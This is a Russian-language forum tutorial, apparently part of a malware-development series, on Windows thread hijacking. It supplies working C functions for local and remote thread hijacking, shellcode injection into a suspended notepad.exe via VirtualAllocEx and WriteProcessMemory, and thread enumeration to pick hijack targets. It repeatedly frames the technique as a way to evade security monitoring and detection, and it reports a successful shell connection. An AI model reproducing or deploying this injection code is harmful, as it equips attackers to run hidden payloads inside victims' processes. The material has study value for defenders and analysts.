Первый вопрос, который нужно решить: почему похищать созданный поток для выполнения полезной нагрузки, а не выполнять полезную нагрузку, используя новый созданный поток?<br />
<br />
<b>Основное различие - это видимость полезной нагрузки и скрытность.</b><br />
Создание нового потока для выполнения полезной нагрузки раскроет базовый адрес полезной нагрузки и, следовательно, содержание полезной нагрузки, так как запись нового потока должна указывать на базовый адрес полезной нагрузки в памяти.<br />
<b>Это не так при похищении потока,</b> потому что запись потока будет указывать на обычную функцию процесса, и поток будет выглядеть безобидно.<br />
<br />
<b>Шаги Похищения Локального Потока</b><br />
<br />
В этом разделе описываются необходимые шаги для выполнения похищения потока, созданного в локальном процессе.<br />
<br />
Стоит отметить, что невозможно похитить главный поток локального процесса, потому что целевой поток сначала должен быть переведен в приостановленное состояние. Это проблематично при нацеливании на главный поток, так как именно он выполняет код и не может быть приостановлен. Поэтому не стоит нацеливаться на главный поток при выполнении похищения локального потока.<br />
<br />
Сначала будет вызвана CreateThread для создания потока и установки безвредной функции в качестве записи потока. Затем дескриптор потока будет использоваться для выполнения необходимых шагов, чтобы похитить поток и выполнить полезную нагрузку.<br />
<br />
<b>Изменение Контекста Потока</b><br />
<br />
Следующим шагом является получение контекста потока с целью его изменения и указания на полезную нагрузку. Когда поток возобновляет выполнение, выполняется полезная нагрузка.<br />
<br />
Как было упомянуто ранее, GetThreadContext будет использоваться для получения структуры CONTEXT целевого потока. Некоторые значения структуры будут изменены, чтобы изменить контекст текущего потока с помощью SetThreadContext.<br />
Значения, которые меняются в структуре, решают, что поток будет выполнять далее. Это значения регистров RIP (для 64-битных процессоров) или EIP (для 32-битных процессоров).<br />
<br />
Регистры RIP и EIP, также известные как регистры указателей инструкций, указывают на следующую инструкцию для выполнения. Они обновляются после каждой выполненной инструкции.<br />
<br />
<b>Пример функции похищения потока RunViaClassicThreadHijacking </b>- это специально созданная функция, которая выполняет похищение потока.<br />
<br />
Функция требует 3 аргумента:<br />
<br />
hThread - Дескриптор приостановленного потока, который будет похищен.<br />
pPayload - Указатель на базовый адрес полезной нагрузки.<br />
sPayloadSize - Размер полезной нагрузки.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID    pAddress         = NULL;
    DWORD    dwOldProtection  = NULL;
    CONTEXT  ThreadCtx        = {
        .ContextFlags = CONTEXT_CONTROL
    };

    // Allocating memory for the payload
    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL){
        printf(&quot;[!] VirtualAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Copying the payload to the allocated memory
    memcpy(pAddress, pPayload, sPayloadSize);

    // Changing the memory protection
    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Getting the original thread context
    if (!GetThreadContext(hThread, &amp;ThreadCtx)){
        printf(&quot;[!] GetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Updating the next instruction pointer to be equal to the payload&#039;s address
    ThreadCtx.Rip = pAddress;

    // Updating the new thread context
    if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;[!] SetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Пример использования</b><br />
<br />
Поскольку RunViaClassicThreadHijacking требует дескриптор потока, главная функция должна будет его предоставить. Как уже упоминалось ранее, целевой поток должен находиться в приостановленном состоянии, чтобы RunViaClassicThreadHijacking успешно похитил поток.<br />
<br />
Для создания нового потока будет использован WinAPI CreateThread. Новый поток должен выглядеть максимально безобидно, чтобы избежать обнаружения. Это можно достичь, создав безобидную функцию, которая будет выполняться этим новым потоком.<br />
<br />
Следующим шагом является приостановка нового потока, чтобы GetThreadContext завершился успешно. Это можно сделать двумя способами:<br />
<ol>
<li data-xf-list-type="ol">Передача флага CREATE_SUSPENDED в параметр dwCreationFlags CreateThread. Этот флаг создает поток в приостановленном состоянии.</li>
<li data-xf-list-type="ol">Создание обычного потока, но его последующая приостановка с помощью WinAPI SuspendThread.</li>
</ol>Будет использован первый метод, так как он требует меньше вызовов WinAPI. Однако оба метода потребуют возобновления потока после выполнения RunViaClassicThreadHijacking. Это будет достигнуто с использованием WinAPI ResumeThread, который требует только дескриптор приостановленного потока.<br />
<br />
<b>Главная Функция</b><br />
<br />
В главной функции будет создан безобидный поток, который сначала будет выполнять безобидную заглушечную функцию, которую затем будут похищать с использованием RunViaClassicThreadHijacking для выполнения полезной нагрузки.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    HANDLE hThread = NULL;

    // Создание безобидного потока в приостановленном состоянии
    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &amp;DummyFunction, NULL, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        printf(&quot;[!] CreateThread Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Похищение созданного потока
    if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {
        return -1;
    }

    // Возобновление приостановленного потока, чтобы он выполнил наш шеллкод
    ResumeThread(hThread);

    printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div><br />
<b>Демонстрация</b><br />
<br />
mainCRTStartup - это главный поток, выполняющий главную функцию, а поток DummyFunction - это поток, который мы похищаем.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781090699.png"
		data-src="https://osint42.org/attachments/1746781090699-png.122/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781090699-png.122/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781090699.png"
			title="1746781090699.png"
			width="1064" height="564" loading="lazy" />
	</div><br />
<br />
Успешный коннект с шеллом<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781098037.png"
		data-src="https://osint42.org/attachments/1746781098037-png.123/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781098037-png.123/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781098037.png"
			title="1746781098037.png"
			width="1151" height="256" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781107066.png"
		data-src="https://osint42.org/attachments/1746781107066-png.124/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781107066-png.124/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781107066.png"
			title="1746781107066.png"
			width="1237" height="487" loading="lazy" />
	</div><br />
<br />
<b>Похищение Потока - Создание Удаленного Потока</b><br />
<br />
Давайте теперь попробуем ту же технику для удаленного процесса, а не для локального.<br />
<br />
Еще одно заметное различие заключается в том,<b><u> что жертвенный поток не будет создан в удаленном процессе. </u></b>Хотя это можно сделать с помощью вызова WinAPI CreateRemoteThread, это функция, которая часто злоупотребляется, <b>и поэтому она активно мониторится системами безопасности.</b><br />
<br />
Лучший подход заключается в создании жертвенного процесса в приостановленном состоянии с помощью CreateProcess, который создает все свои потоки в приостановленном состоянии, что позволяет их похищать.<br />
<br />
<b>Шаги Похищения Удаленного Потока</b><br />
<br />
В этом разделе описываются необходимые шаги для выполнения похищения потока, находящегося в удаленном процессе.<br />
<br />
<b>WinAPI CreateProcess CreateProcess</b><br />
<br />
Это мощный и важный WinAPI, имеющий различные применения. Для того чтобы пользователи имели твердое понимание, ниже объяснены важные параметры функции.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);</code></pre>
	</div>
</div><br />
Параметры lpApplicationName и lpCommandLine представляют собой имя процесса и его аргументы командной строки соответственно. Например, lpApplicationName может быть C:\Windows\System32\cmd.exe, а lpCommandLine может быть /k whoami.<br />
В качестве альтернативы, lpApplicationName может быть установлен в NULL, но lpCommandLine может содержать имя процесса и его аргументы, C:\Windows\System32\cmd.exe /k whoami. Оба параметра помечены как необязательные, что означает, что для новосозданного процесса не требуются никакие аргументы.<br />
<br />
dwCreationFlags - это параметр, который контролирует класс приоритета и создание процесса. Возможные значения для этого параметра можно найти здесь (примечание: ссылка не предоставлена в исходном тексте). Например, используя флаг CREATE_SUSPENDED, создается процесс в приостановленном состоянии.<br />
<br />
lpStartupInfo - это указатель на STARTUPINFO, который содержит детали, связанные с созданием процесса. Единственный элемент, который нужно заполнить, - это DWORD cb, который представляет собой размер структуры в байтах.<br />
<br />
lpProcessInformation - это выходной параметр, который возвращает структуру PROCESS_INFORMATION. Структура PROCESS_INFORMATION представлена ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PROCESS_INFORMATION {
  HANDLE hProcess;        // Дескриптор только что созданного процесса.
  HANDLE hThread;         // Дескриптор основного потока только что созданного процесса.
  DWORD  dwProcessId;     // Идентификатор процесса
  DWORD  dwThreadId;      // Идентификатор основного потока
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;</code></pre>
	</div>
</div><br />
Эта структура содержит информацию о новосозданном процессе и его основном потоке.<br />
<br />
<b>Использование переменных окружения</b><br />
<br />
Последний оставшийся компонент для создания процесса - это определение полного пути к процессу.<br />
Жертвенный процесс будет создан на основе бинарного файла, находящегося в каталоге System32. Можно предположить, что путь будет C:\Windows\System32 и жестко закодировать это значение, но всегда безопаснее программно определить путь. Д<br />
ля этого будет использована функция WinAPI GetEnvironmentVariableA.<br />
GetEnvironmentVariableA извлекает значение указанной переменной окружения, которой в данном случае будет &quot;WINDIR&quot;.<br />
<br />
&quot;WINDIR&quot; - это переменная окружения, которая указывает на каталог установки операционной системы Windows. На большинстве систем этот каталог находится в &quot;C:\Windows&quot;. Значение переменной окружения &quot;WINDIR&quot; можно получить, введя &quot;echo %WINDIR%&quot; в командной строке или просто введя %WINDIR% в строке поиска проводника файлов.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD GetEnvironmentVariableA(
  [in, optional]  LPCSTR lpName,
  [out, optional] LPSTR  lpBuffer,
  [in]            DWORD  nSize
);</code></pre>
	</div>
</div><br />
<b>Функция создания жертвенного процесса</b><br />
<br />
Функция CreateSuspendedProcess используется для создания жертвенного процесса в приостановленном состоянии. Она требует 4 аргумента:<br />
<ul>
<li data-xf-list-type="ul">lpProcessName - имя процесса для создания.</li>
<li data-xf-list-type="ul">dwProcessId - указатель на DWORD, который получает идентификатор процесса.</li>
<li data-xf-list-type="ul">hProcess - указатель на HANDLE, который получает дескриптор процесса.</li>
<li data-xf-list-type="ul">hThread - указатель на HANDLE, который получает дескриптор потока.</li>
</ul>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    // Очистка структур, устанавливая значения членов в 0
    RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

    // Установка размера структуры
    Si.cb = sizeof(STARTUPINFO);

    // Получение значения переменной окружения %WINDIR%
    if (!GetEnvironmentVariableA(&quot;WINDIR&quot;, WnDr, MAX_PATH)) {
        printf(&quot;[!] GetEnvironmentVariableA Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Создание полного пути к целевому процессу
    sprintf(lpPath, &quot;%s\\System32\\%s&quot;, WnDr, lpProcessName);
    printf(&quot;\n\t[i] Running : \&quot;%s\&quot; ... &quot;, lpPath);

    if (!CreateProcessA(
        NULL,                   // Нет имени модуля (использовать командную строку)
        lpPath,                 // Командная строка
        NULL,                   // Дескриптор процесса не наследуется
        NULL,                   // Дескриптор потока не наследуется
        FALSE,                  // Установить наследование дескриптора в FALSE
        CREATE_SUSPENDED,       // Флаг создания
        NULL,                   // Использовать окружение родителя
        NULL,                   // Использовать рабочий каталог родителя
        &amp;Si,                    // Указатель на структуру STARTUPINFO
        &amp;Pi)) {                 // Указатель на структуру PROCESS_INFORMATION

        printf(&quot;[!] CreateProcessA Failed with Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;[+] DONE \n&quot;);

    // Заполнение выходных параметров результатами CreateProcessA
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Проверка, что получены все необходимые значения
    if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
        return TRUE;

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Функция внедрения в удаленный процесс</b><br />
<br />
Следующим шагом после создания целевого процесса в приостановленном состоянии является внедрение полезной нагрузки с использованием функции InjectShellcodeToRemoteProcess.<br />
Полезная нагрузка записывается только в удаленный процесс, но не выполняется. Базовый адрес затем сохраняется для последующего использования через похищение потока.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
    SIZE_T sNumberOfBytesWritten = NULL;
    DWORD dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf(&quot;\n\t[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }
    printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, *ppAddress);

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &amp;sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf(&quot;\n\t[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;\n\t[!] VirtualProtectEx Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Функция похищения удаленного потока</b><br />
<br />
После создания приостановленного процесса и записи полезной нагрузки в удаленный процесс, заключительный этап заключается в использовании дескриптора потока, возвращенного CreateSuspendedProcess, чтобы выполнить похищение потока. Эта часть такая же, как и та, что демонстрировалась в части похищения локального потока.<br />
<br />
В качестве итога, функция GetThreadContext используется для извлечения контекста потока, обновления регистра RIP, указывающего на записанную полезную нагрузку, вызова SetThreadContext для обновления контекста потока и, наконец, использования ResumeThread для выполнения полезной нагрузки.<br />
<br />
<b>Все это демонстрируется в пользовательской функции ниже, HijackThread, которая принимает два аргумента:</b><br />
<ul>
<li data-xf-list-type="ul">hThread - поток для похищения.</li>
<li data-xf-list-type="ul">pAddress - указатель на базовый адрес полезной нагрузки, которая будет выполнена.</li>
</ul>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
    CONTEXT ThreadCtx = {
        .ContextFlags = CONTEXT_CONTROL
    };

    // получение исходного контекста потока
    if (!GetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\n\t[!] GetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // обновление указателя на следующую инструкцию, чтобы он был равен адресу нашего шеллкода
    ThreadCtx.Rip = pAddress;

    // установка нового обновленного контекста потока
    if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\n\t[!] SetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // возобновление приостановленного потока, таким образом запуская нашу полезную нагрузку
    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Демо</b><br />
<br />
В этой демонстрации используется Notepad.exe в качестве жертвенного процесса, его поток похищается и выполняется shellcode от Msfvenom для запуска калькулятора.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781127213.png"
		data-src="https://osint42.org/attachments/1746781127213-png.125/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781127213-png.125/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781127213.png"
			title="1746781127213.png"
			width="1250" height="848" loading="lazy" />
	</div><br />
<br />
<br />
<b>Перечисление локальных потоков</b><br />
<br />
До сих пор, когда производилось похищение локального потока, целевой поток создавался с использованием CreateThread, и его контекст изменялся. В этой части будет продемонстрирован альтернативный метод, при котором работающие потоки системы перечисляются с помощью CreateToolhelp32Snapshot, а затем похищаются.<br />
<br />
<b>Перечисление потоков</b><br />
<br />
Вспомните использование CreateToolhelp32Snapshot из предыдущих частей, где WinAPI использовался для получения снимка процессов системы. В этом модуле используется тот же WinAPI, но с другим значением для параметра dwFlags.<br />
Чтобы перечислить работающие потоки системы, необходимо указать флаг TH32CS_SNAPTHREAD. Используя этот флаг, CreateToolhelp32Snapshot возвращает структуру THREADENTRY32, показанную ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct tagTHREADENTRY32 {
  DWORD dwSize;                       // sizeof(THREADENTRY32)
  DWORD cntUsage;
  DWORD th32ThreadID;                 // ID потока
  DWORD th32OwnerProcessID;           // PID процесса, создавшего поток.
  LONG  tpBasePri;
  LONG  tpDeltaPri;
  DWORD dwFlags;
} THREADENTRY32;</code></pre>
	</div>
</div><br />
Каждый работающий поток имеет свою собственную структуру THREADENTRY32 на захваченном снимке.<br />
<br />
<b>Определение владельца потока согласно документации Microsoft:</b><br />
<br />
Чтобы определить потоки, которые принадлежат конкретному процессу, сравните его идентификатор процесса с членом th32OwnerProcessID структуры THREADENTRY32 при перечислении потоков.<br />
<br />
Другими словами, чтобы определить процесс, к которому принадлежит поток, сравните целевой PID с THREADENTRY32.th32OwnerProcessID, который является PID процесса, создавшего поток.<br />
Если PID совпадают, то в настоящее время перечисляемый поток принадлежит целевому процессу.<br />
<br />
<b>Необходимые WinAPI</b><br />
<br />
Будут использованы следующие WinAPI для выполнения перечисления потока:<br />
<ul>
<li data-xf-list-type="ul">CreateToolhelp32Snapshot - используется с флагом TH32CS_SNAPTHREAD для получения снимка всех потоков, работающих в системе.</li>
<li data-xf-list-type="ul">Thread32First - используется для получения информации о первом потоке, захваченном на снимке.</li>
<li data-xf-list-type="ul">Thread32Next - используется для получения информации о следующем потоке на захваченном снимке.</li>
<li data-xf-list-type="ul">OpenThread - используется для открытия дескриптора целевого потока с использованием его идентификатора потока.</li>
<li data-xf-list-type="ul">GetCurrentProcessId - используется для получения PID локального процесса. Поскольку локальный процесс является целевым процессом, требуется его PID, чтобы определить, принадлежат ли потоки этому процессу.</li>
</ul><b>Рабочие потоки</b><br />
<br />
Прежде чем погружаться в код перечисления потоков, важно понять концепцию рабочих потоков. Хотя CreateThread не используется в коде, операционная система Windows создаст рабочие потоки в процессе. Эти рабочие потоки являются допустимыми целями для похищения потока. Пример этих рабочих потоков можно увидеть ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781136597.png"
		data-src="https://osint42.org/attachments/1746781136597-png.126/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781136597-png.126/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781136597.png"
			title="1746781136597.png"
			width="1007" height="110" loading="lazy" />
	</div><br />
<br />
Потоки, показанные на изображении выше, например, ntdll.dll!EtwNotificationRegister+0x2d0, создаются операционной системой для выполнения функции EtwNotificationRegister, которая связана с ETW - трассировкой событий для Windows.<br />
ETW будет объяснено в будущих модулях, но на данный момент достаточно понимать, что эта функция используется для уведомления операционной системы, когда в процессе происходит определенное событие.<br />
<br />
<b>Функция перечисления потоков GetLocalThreadHandle</b> использует ранее упомянутые шаги для выполнения перечисления потоков.<br />
<br />
Она принимает 3 аргумента:<br />
<ul>
<li data-xf-list-type="ul">dwMainThreadId - Идентификатор главного потока локального процесса.</li>
<li data-xf-list-type="ul">dwThreadId - Указатель на DWORD, который получает ID потока, который можно захватить.</li>
<li data-xf-list-type="ul">hThread - Указатель на HANDLE, который получает дескриптор для потока, который можно захватить.</li>
</ul>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {

    // Получение ID локального процесса
    DWORD           dwProcessId  = GetCurrentProcessId();
    HANDLE          hSnapShot    = NULL;
    THREADENTRY32   Thr          = {
        .dwSize = sizeof(THREADENTRY32)
    };

    // Создание снимка потоков текущего запущенного процесса
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf(&quot;\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    // Получение информации о первом потоке, обнаруженном в снимке.
    if (!Thread32First(hSnapShot, &amp;Thr)) {
        printf(&quot;\n\t[!] Thread32First Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    do {
        // Если PID потока равен PID целевого процесса, то
        // этот поток выполняется в целевом процессе
        // &#039;Thr.th32ThreadID != dwMainThreadId&#039; используется для исключения главного потока нашего локального процесса
        if (Thr.th32OwnerProcessID == dwProcessId &amp;&amp; Thr.th32ThreadID != dwMainThreadId) {

            // Открытие дескриптора потока
            *dwThreadId  = Thr.th32ThreadID;
            *hThread     = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

            if (*hThread == NULL)
                printf(&quot;\n\t[!] OpenThread Failed With Error : %d \n&quot;, GetLastError());

            break;
        }

    // Пока в снимке остаются потоки
    } while (Thread32Next(hSnapShot, &amp;Thr));


_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwThreadId == NULL || *hThread == NULL)
        return FALSE;
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Функция локального перехвата потока</b><br />
<br />
После получения действительного дескриптора целевого потока его можно передать в функцию HijackThread.<br />
WinAPI SuspendThread будет использован для приостановки потока, а затем GetThreadContext и SetThreadContext будут использованы для обновления регистра RIP, чтобы он указывал на базовый адрес загруженного полезного кода. Кроме того, перед перехватом потока полезный код должен быть записан в память локального процесса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL HijackThread(HANDLE hThread, PVOID pAddress) {

    CONTEXT    ThreadCtx = {
        .ContextFlags = CONTEXT_ALL
    };

    SuspendThread(hThread);

    if (!GetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\t[!] GetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    ThreadCtx.Rip = pAddress;

    if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\t[!] SetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;\t[#] Нажмите &lt;Enter&gt; для выполнения ... &quot;);
    getchar();

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Демонстрация </b><br />
<br />
Обратите внимание, что выполнение полезного кода может занять некоторое время, так как перехваченный поток не является главным потоком и не выполняется непрерывно.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781147794.png"
		data-src="https://osint42.org/attachments/1746781147794-png.127/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781147794-png.127/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781147794.png"
			title="1746781147794.png"
			width="1473" height="523" loading="lazy" />
	</div><br />
<br />
Кроме того, в зависимости от полезной нагрузки, локальный процесс может завершиться сбоем после выполнения. Например, если полезная нагрузка предназначена для сервера управления и контроля, процесс будет продолжать работу. <b>Однако, если использовался shellcode calc от Msfvenom, процесс завершится сбоем, потому что shellcode calc от Msfvenom завершает вызывающий поток.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781162877.png"
		data-src="https://osint42.org/attachments/1746781162877-png.128/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781162877-png.128/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781162877.png"
			title="1746781162877.png"
			width="1278" height="566" loading="lazy" />
	</div><br />
<br />
<b>Перечисление удаленных потоков</b><br />
<br />
В этой части рассматривается использование CreateToolhelp32Snapshot для перечисления потоков удаленного процесса. В GetLocalThreadHandle, показанном ранее, внесены небольшие изменения, чтобы сделать его работу с удаленными потоками.<br />
<br />
Логика остается прежней, где используются CreateToolhelp32Snapshot, Thread32First и Thread32Next для перечисления потоков целевого процесса.<br />
<br />
<b>Отличие при нападении на удаленные процессы заключается в том, что основной поток также может быть целью для захвата.<br />
<br />
Функция перечисления удаленных потоков</b><br />
<br />
GetRemoteThreadhandle перечисляет потоки удаленного процесса. Он принимает 3 аргумента:<br />
<br />
dwProcessId - это PID целевого процесса. Как его получить, читайте в теме Определение PID нужного процесса, или перечисления процессов | Цикл статей &quot;Изучение вредоносных программ&quot;  этого цикла статей.<br />
dwThreadId - указатель на DWORD, который получит идентификатор потока целевого процесса.<br />
hThread - указатель на HANDLE, который получит дескриптор удаленного потока.<br />
<br />
Дополнительное отличие в реализации функции GetRemoteThreadhandle заключается в том, что нужно предоставить целевой PID.<br />
В случае целевого процесса, который работает локально, это не требуется, потому что GetCurrentProcessId WinAPI извлекает PID локального процесса.<br />
